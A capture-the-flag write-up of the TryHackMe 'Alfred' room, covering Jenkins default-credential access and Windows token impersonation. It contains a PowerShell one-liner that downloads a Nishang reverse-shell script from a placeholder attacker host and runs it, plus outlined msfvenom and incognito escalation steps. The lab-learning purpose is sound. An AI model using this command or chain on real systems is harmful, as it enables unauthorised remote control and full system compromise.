# TryHackMe — Alfred Write-up

**Focus:** Web Exploitation, Windows Post‑Exploitation, Token Impersonation  
**Target OS:** Windows  

--- 

## Overview

This room demonstrates the exploitation of a common misconfiguration in a Jenkins automation server to gain initial access, followed by Windows privilege escalation through token impersonation.

The engagement highlights how weak credentials on administrative services can lead to full system compromise when combined with powerful Windows privileges such as `SeImpersonatePrivilege`.

---

## Reconnaissance

Initial reconnaissance was performed using **nmap** to identify exposed services on the target machine.

The scan revealed **three open TCP ports**, two of which were HTTP services. Further investigation showed that **port 8080** was hosting a Jenkins login panel.

Testing common default credentials revealed that the Jenkins instance was accessible using:

```
admin:admin
```

This confirmed an administrative foothold on the Jenkins service.

---

## Initial Access

Once authenticated to Jenkins, the existing project configuration was leveraged to execute commands on the underlying Windows system.

To obtain an interactive shell, a PowerShell reverse shell from the **Nishang** framework was used. The script was hosted on the attacker machine using a temporary HTTP server, allowing the target to download and execute it.

The following PowerShell command was executed through Jenkins to establish a reverse shell:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:ATTACKER_PORT/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port ATTACKER_PORT
```

A Netcat listener was started on the attacker machine, resulting in a successful reverse shell connection.

---

## Privilege Escalation

Post‑exploitation enumeration revealed that the compromised user had powerful Windows privileges enabled. Running the following command:

```powershell
whoami /priv
```

showed that both `SeDebugPrivilege` and `SeImpersonatePrivilege` were available.

Because token impersonation is more reliably exploited using Meterpreter, the shell was upgraded.

A Meterpreter payload was generated using **msfvenom**, transferred to the target system, and executed. A Metasploit listener was configured to receive the session.

Once the Meterpreter session was established, the **incognito** module was loaded to enumerate and impersonate available tokens.

An administrative token was successfully impersonated. However, impersonating a token alone does not guarantee full SYSTEM privileges. To fully escalate, the session was migrated into a process running under `NT AUTHORITY\SYSTEM`.

After migrating to a SYSTEM‑level process, full administrative access to the machine was achieved.

---

## Conclusion & Key Takeaways

This room demonstrates several important real‑world security lessons:

- Administrative interfaces such as Jenkins should never be exposed with default credentials
- Jenkins jobs can be abused to execute arbitrary system commands when administrative access is obtained
- Windows privileges like `SeImpersonatePrivilege` are extremely dangerous when misconfigured
- Token impersonation attacks often require process migration to fully escalate privileges

Overall, this lab provides a strong example of chaining weak authentication, command execution, and Windows token abuse to achieve complete system compromise.

---

**Lab Environment:**  
TryHackMe VM (Windows), VPN‑based isolated network